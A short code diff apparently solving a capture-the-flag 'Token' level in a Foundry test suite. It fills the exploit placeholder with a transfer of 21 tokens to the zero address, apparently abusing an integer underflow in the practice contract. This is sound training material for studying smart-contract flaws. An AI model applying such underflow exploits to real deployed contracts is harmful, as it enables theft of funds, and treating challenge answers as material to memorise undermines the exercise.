@@ -34,10 +34,8 @@ contract TestToken is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
-        vm.startPrank(player, player);
-
+        vm.startPrank(player);
+        level.transfer(address(0), 21);
         vm.stopPrank();
     }
 }
